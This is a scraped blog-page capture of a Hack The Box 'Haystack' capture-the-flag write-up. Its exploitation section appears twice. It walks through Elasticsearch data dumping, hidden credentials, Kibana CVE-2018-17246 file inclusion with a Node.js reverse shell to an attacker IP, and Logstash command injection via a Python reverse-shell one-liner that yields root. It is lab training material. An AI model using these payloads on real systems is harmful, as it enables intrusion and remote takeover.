/usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/ kibana/bin/../src/cli -c /etc/kibana/kibana.yml [security@haystack ~]$ ls /usr/share/kibana/bin kibana kibana-keystore kibana-plugin Exploitation We then find out what is the version of kibana. 1 2 [security@haystack ~]$ /usr/share/kibana/bin/kibana --version 6.4.2 This version of kibana is affected by the local file inclusion vulnerability CVE-2018-17246. More information on how to exploit it could be found here Lets create a reverse shell file written in node. 1 2 3 4 5 6 7 8 9 10 11 12 (function(){ var net = require(&quot;net&quot;), cp = require(&quot;child_process&quot;), sh = cp.spawn(&quot;/bin/bash&quot;, []); var client = new net.Socket(); client.connect(1337, &quot;10.10.XXX.XXX&quot;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing })(); And transfer it over to the Haystack machine. 1 2 3 4 5 [security@haystack tmp]$ curl http://10.10.14.75/exploit.js &gt; exploit.js % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 383 100 383 0 0 578 0 --:--:-- --:--:-- --:--:-- 578 [security@haystack tmp]$ chmod 777 exploit.js On our machine, we start a listener. 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... We then proceed to exploit the vulnerability on the Haystack machine. 1 2 3 [security@haystack tmp]$ curl -XGET &quot;http://127.0.0.1:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../ tmp/exploit.js&quot; Back to our machine, we caught the reverse shell. 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.115] 39144 python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; bash-4.2$ id uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0 root.txt As user kibana, we can now write to the /opt/kibana directory. 1 2 3 4 bash-4.2$ touch /opt/kibana/logstash_cmd touch /opt/kibana/logstash_cmd bash-4.2$ chmod 777 /opt/kibana/logstash_cmd chmod 777 /opt/kibana/logstash_cmd Before writing the line to the file, we need to first start another listener on our machine. 1 2 $ nc -lvnp 1338 listening on [any] 1338 ... We then proceeded to write our reverse shell command to the file. 1 2 3 bash-4.2$ echo &quot;Ejecutar comando : python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\&quot;10.10.XXX.XXX\&quot;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/ sh\&quot;,\&quot;-i\&quot;]);&#39;&quot; &gt;&gt; /opt/kibana/logstash_cmd Back to our machine, we finally got a root shell! 1 2 3 4 5 6 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.115] 57600 sh: no hay control de trabajos en este shell sh-4.2# id uid=0(root) gid=0(root) grupos=0(root) contexto=system_u:system_r:unconfined_service_t:s0 sh-4.2# cat /root/root.txt 3f5fXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/haystack-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/haystack-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-11-03T18:38:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Haystack" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/haystack-htb/"},"description":"I really felt that this machine resonated with me because of the Elastic Stack components running on it and I happened to be learning about them at that point of time XD Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.115 haystack.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ nmap -sV -sT -sC haystack.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-29 02:40 EDT Nmap scan report for haystack.htb (10.10.10.115) Host is up (0.63s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA) | 256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA) |_ 256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519) 80/tcp open http nginx 1.12.2 |_http-server-header: nginx/1.12.2 |_http-title: Site doesn&#39;t have a title (text/html). 9200/tcp open http nginx 1.12.2 | http-methods: |_ Potentially risky methods: DELETE |_http-server-header: nginx/1.12.2 |_http-title: Site doesn&#39;t have a title (application/json; charset=UTF-8). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.00 seconds Not much can be done with the ssh service as we do not have any credentials on hand so lets come back to it later. Lets first check out the http service! Haha of course it is a needle! XD Enumeration (1) There doesn’t seem much, so lets brute force the directory and files using gobuster. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ gobuster dir -u http://haystack.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://haystack.htb [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2019/08/29 02:13:56 Starting gobuster =============================================================== =============================================================== 2019/08/29 02:18:53 Finished =============================================================== Nothing ? Seems like a dead end. Lets move on to the http service on port 9200. When I saw the port number, I immediately guessed that Elasticsearch was running on it. The below screenshot confirms it. The first step was to know what indexes are available on it. An index is like a table in relational databases and also contains JSON documents that are similar to the rows in a table. 1 2 3 4 5 $ curl http://haystack.htb:9200/_cat/indices?v health status index uuid pri rep docs.count docs.deleted store.size pri.store.size green open .kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0 1 0 4kb 4kb yellow open quotes ZG2D1IqkQNiNZmi2HRImnQ 5 1 253 0 262.7kb 262.7kb yellow open bank eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb There are a total of 3 indices. The .kibana is an index that contains configurations for Kibana. This confirms that there might be a Kibana service running on the machine, but we are unable to access it from the outside. The quotes and bank indexes seem interesting, so lets dump them out! I made a python script to ease my job: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import requests import json def pretty_print(json_string): return json.dumps(json.loads(json_string), indent=4, sort_keys=True) data = { &quot;query&quot;: { &quot;match_all&quot;: {} } } params = { &quot;size&quot;: 10000 } host = &quot;http://haystack.htb:9200&quot; with open(&quot;quotes.txt&quot;, &quot;w&quot;) as f: resp = requests.get(host + &quot;/quotes/_search&quot;, params=params, json=data) f.write(pretty_print(resp.content)) f.close() with open(&quot;bank.txt&quot;, &quot;w&quot;) as f: resp = requests.get(host + &quot;/bank/_search&quot;, params=params, json=data) f.write(pretty_print(resp.content)) f.close() After running the script, we should get quotes.txt and bank.txt, each containing a list of JSONs. For bank.txt, it seems to contain records of personal information 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 &quot;hits&quot;: { &quot;hits&quot;: [ { &quot;_id&quot;: &quot;25&quot;, &quot;_index&quot;: &quot;bank&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;account_number&quot;: 25, &quot;address&quot;: &quot;171 Putnam Avenue&quot;, &quot;age&quot;: 39, &quot;balance&quot;: 40540, &quot;city&quot;: &quot;Nicholson&quot;, &quot;email&quot;: &quot;virginiaayala@filodyne.com&quot;, &quot;employer&quot;: &quot;Filodyne&quot;, &quot;firstname&quot;: &quot;Virginia&quot;, &quot;gender&quot;: &quot;F&quot;, &quot;lastname&quot;: &quot;Ayala&quot;, &quot;state&quot;: &quot;PA&quot; }, &quot;_type&quot;: &quot;account&quot; }, ... ] } For quotes.txt, it seems to contain paragraphs in spanish ? 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 &quot;hits&quot;: { &quot;hits&quot;: [ { &quot;_id&quot;: &quot;14&quot;, &quot;_index&quot;: &quot;quotes&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;quote&quot;: &quot;En Am\\u00e9rica se desarrollaron importantes civilizaciones, como Caral (la civilizaci\\u00f3n m\\u00e1s antigua de Am\\u00e9rica, la cual se desarroll\\u00f3 en la zona central de Per\\u00fa), los anasazi, los indios pueblo, quimbaya, nazca, chim\\u00fa, chav\\u00edn, paracas, moche, huari, lima, zapoteca, mixteca, totonaca, tolteca, olmeca y chibcha, y las avanzadas civilizaciones correspondientes a los imperios de Teotihuacan, Tiahuanaco, maya, azteca e inca, entre muchos otros.&quot; }, &quot;_type&quot;: &quot;quote&quot; }, ... ] } It really was like finding a needle in a haystack as I did not know what I was looking for but I still tried to manually look through quotes.txt. Then I came across this: 1 2 3 4 5 6 7 8 9 { &quot;_id&quot;: &quot;2&quot;, &quot;_index&quot;: &quot;quotes&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;quote&quot;: &quot;There&#39;s a needle in this haystack, you have to search for it&quot; }, &quot;_type&quot;: &quot;quote&quot; } Well I guess that was helpful? :/ After a while I found something interesting! 1 2 3 4 5 6 7 8 9 { &quot;_id&quot;: &quot;111&quot;, &quot;_index&quot;: &quot;quotes&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;quote&quot;: &quot;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&quot; }, &quot;_type&quot;: &quot;quote&quot; } There seems to be some Base64-encoded string in the quote! Decoding it, we get pass: spanish.is.key If there is a password, there must be a username! Lets carry on searching… 1 2 3 4 5 6 7 8 9 { &quot;_id&quot;: &quot;45&quot;, &quot;_index&quot;: &quot;quotes&quot;, &quot;_score&quot;: 1.0, &quot;_source&quot;: { &quot;quote&quot;: &quot;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &quot; }, &quot;_type&quot;: &quot;quote&quot; }, Finally! Likewise, there was a Base64-encoded string. Decoding it, we get user: security. user.txt Using security:spanish.is.key, we try to log in via ssh. 1 2 3 4 5 6 $ ssh security@haystack.htb security@haystack.htb&#39;s password: [security@haystack ~]$ ls user.txt [security@haystack ~]$ cat user.txt 04d1XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) As security, we need to know what processes are being runned on the machine. To do so, I will be using pspy. To transfer it from my machine to this machine, I will be using python’s SimpleHTTPServer module. On my machine: 1 2 3 4 5 $ mkdir httpserver $ cd httpserver $ cp ~/Downloads/pspy64 . $ python -m SimpleHTTPServer 80 Serving HTTP on 0.0.0.0 port 80 ... On the Haystack machine: 1 2 3 4 5 6 [security@haystack tmp]$ curl http://10.10.14.75/pspy64 &gt; pspy64 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 4364k 100 4364k 0 0 639k 0 0:00:06 0:00:06 --:--:-- 834k [security@haystack tmp]$ chmod 777 pspy64 [security@haystack tmp]$ ./pspy64 After a while, I noticed a process running with root privileges and the process is Logstash! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 2019/08/29 06:20:05 CMD: UID=0 PID=6397 | /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfile.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/share/logstash/logstash-core/lib/jars/ commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/ lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-core/lib/jars/google-java-format-1.1.jar:/usr/share/ logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/ share/logstash/logstash-core/lib/jars/j2objc-annotations-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/ jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/ lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/ logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/ share/logstash/logstash-core/lib/jars/jsr305-1.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/ logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/ share/logstash/logstash-core/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/ share/logstash/logstash-core/lib/jars/org.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/ logstash/logstash-core/lib/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/ logstash/logstash-core/lib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/ usr/share/logstash/logstash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/ org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/ logstash-core/lib/jars/slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash Logstash is a program that is able to injest data or logs, process them and forward to other destinations. The configuration files for Logstash are typically located at /etc/logstash. 1 2 3 4 5 [security@haystack ~]$ ls /etc/logstash conf.d log4j2.properties logstash.yml pipelines.yml jvm.options logstash-sample.conf logstash.yml.rpmnew startup.options [security@haystack logstash]$ ls /etc/logstash/conf.d filter.conf input.conf output.conf In the conf.d folder contains the files on how Logstash processes the information. input.conf: 1 2 3 4 5 6 7 8 9 10 input { file { path =&gt; &quot;/opt/kibana/logstash_*&quot; start_position =&gt; &quot;beginning&quot; sincedb_path =&gt; &quot;/dev/null&quot; stat_interval =&gt; &quot;10 second&quot; type =&gt; &quot;execute&quot; mode =&gt; &quot;read&quot; } } filter.conf: 1 2 3 4 5 6 7 8 filter { if [type] == &quot;execute&quot; { grok { match =&gt; { &quot;message&quot; =&gt; &quot;Ejecutar\\s*comando\\s*:\\s+%{GREEDYDATA:comando}&quot; } } } } output.conf: 1 2 3 4 5 6 7 8 output { if [type] == &quot;execute&quot; { stdout { codec =&gt; json } exec { command =&gt; &quot;%{comando} &amp;&quot; } } } From these, we can tell that Logstash is: Reading line by line from all files in /opt/kibana that starts with logstash_ Parsing each line using a certain format Ejecutar comando : &lt;COMMAND&gt; Executing the captured &lt;COMMAND&gt; To start off, lets try to create a file in /opt/kibana. But unfortunately, we are not able to as we do not have write permission :( 1 2 3 4 [security@haystack ~]$ touch /opt/kibana/logstash_cmd touch: cannot touch ‘/opt/kibana/logstash_cmd’: Permission denied [security@haystack ~]$ ls -l /opt | grep kibana drwxr-x---. 2 kibana kibana 6 Aug 29 01:35 kibana To be able to write to /opt/kibana, we need to be kibana. But how? First, we will need to find out where is kibana is running from. 1 2 3 4 5 [security@haystack ~]$ ps aux | grep kibana kibana 6401 0.4 5.0 1360968 194848 ? Ssl 00:13 1:47 /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/ kibana/bin/../src/cli -c /etc/kibana/kibana.yml [security@haystack ~]$ ls /usr/share/kibana/bin kibana kibana-keystore kibana-plugin Exploitation We then find out what is the version of kibana. 1 2 [security@haystack ~]$ /usr/share/kibana/bin/kibana --version 6.4.2 This version of kibana is affected by the local file inclusion vulnerability CVE-2018-17246. More information on how to exploit it could be found here Lets create a reverse shell file written in node. 1 2 3 4 5 6 7 8 9 10 11 12 (function(){ var net = require(&quot;net&quot;), cp = require(&quot;child_process&quot;), sh = cp.spawn(&quot;/bin/bash&quot;, []); var client = new net.Socket(); client.connect(1337, &quot;10.10.XXX.XXX&quot;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing })(); And transfer it over to the Haystack machine. 1 2 3 4 5 [security@haystack tmp]$ curl http://10.10.14.75/exploit.js &gt; exploit.js % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 383 100 383 0 0 578 0 --:--:-- --:--:-- --:--:-- 578 [security@haystack tmp]$ chmod 777 exploit.js On our machine, we start a listener. 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... We then proceed to exploit the vulnerability on the Haystack machine. 1 2 3 [security@haystack tmp]$ curl -XGET &quot;http://127.0.0.1:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../ tmp/exploit.js&quot; Back to our machine, we caught the reverse shell. 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.115] 39144 python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; bash-4.2$ id uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0 root.txt As user kibana, we can now write to the /opt/kibana directory. 1 2 3 4 bash-4.2$ touch /opt/kibana/logstash_cmd touch /opt/kibana/logstash_cmd bash-4.2$ chmod 777 /opt/kibana/logstash_cmd chmod 777 /opt/kibana/logstash_cmd Before writing the line to the file, we need to first start another listener on our machine. 1 2 $ nc -lvnp 1338 listening on [any] 1338 ... We then proceeded to write our reverse shell command to the file. 1 2 3 bash-4.2$ echo &quot;Ejecutar comando : python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\\&quot;10.10.XXX.XXX\\&quot;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/ sh\\&quot;,\\&quot;-i\\&quot;]);&#39;&quot; &gt;&gt; /opt/kibana/logstash_cmd Back to our machine, we finally got a root shell! 1 2 3 4 5 6 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.115] 57600 sh: no hay control de trabajos en este shell sh-4.2# id uid=0(root) gid=0(root) grupos=0(root) contexto=system_u:system_r:unconfined_service_t:s0 sh-4.2# cat /root/root.txt 3f5fXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/haystack-htb/","@type":"BlogPosting","headline":"Hack The Box - Haystack","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2019-11-03T18:38:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Haystack | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Haystack</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Haystack</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 3, 2019, 6:38 PM +0800" > Nov 3, 2019 <i class="unloaded">2019-11-03T18:38:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1928 words">10 min</span></div></div><div class="post-content"><p>I really felt that this machine resonated with me because of the Elastic Stack components running on it and I happened to be learning about them at that point of time XD</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 